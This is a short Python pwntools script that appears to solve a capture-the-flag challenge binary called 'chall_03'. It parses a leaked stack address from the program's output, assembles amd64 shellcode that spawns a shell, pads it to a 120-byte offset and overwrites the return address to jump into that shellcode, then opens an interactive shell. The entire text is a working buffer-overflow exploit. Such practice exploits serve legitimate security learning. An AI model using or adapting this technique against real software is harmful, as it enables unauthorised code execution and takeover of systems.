from pwn import *
import re
p=process("./chall_03")
sleep(1)
p.recv()
p.sendline()
resp = p.recv()
shellcoke_lives_here = p64(int(re.findall(b"([a-f0-9]{8,16})", resp)[0],16))
context.arch = "amd64"
shellcode = asm(shellcraft.amd64.sh())
###basepointer = 8
#112 = vuln offset 0x70
payload = shellcode + b"a"*(112+8-len(shellcode))+shellcoke_lives_here
p.sendline(payload)
p.interactive()
